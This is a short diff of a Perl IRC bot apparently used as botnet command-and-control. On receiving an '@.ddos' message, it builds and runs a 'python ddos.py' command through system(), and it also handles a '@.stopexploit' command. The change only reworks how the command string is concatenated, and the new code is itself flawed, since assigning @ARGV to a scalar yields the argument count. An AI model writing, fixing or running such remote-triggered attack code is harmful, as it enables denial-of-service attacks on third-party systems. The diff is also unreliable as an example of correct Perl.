@@ -33,8 +33,18 @@
    warn 'Received PING request, sending PONG.';
    $irc->write(notice => $noticechan => "pong");
    }if ($msg =~ /@.ddos/) {
-   $irc->write(notice => $noticechan => "[DDOS] " + @ARGV);
-   system "python ddos.py " + @ARGV;
+   # Input first string  
+my $string1 = "python ddos.py ";  
+  
+# Input second string  
+my $string2 = @ARGV;   
+  
+my $combine = $string1;    
+  
+# combine two string function (.=) 
+$combine .= $string2;   
+   $irc->write(notice => $noticechan => $combine);
+   system $combine; 
    }
    elsif ($msg =~ /@.stopexploit/) {
     warn 'stopexploit called, killing...';
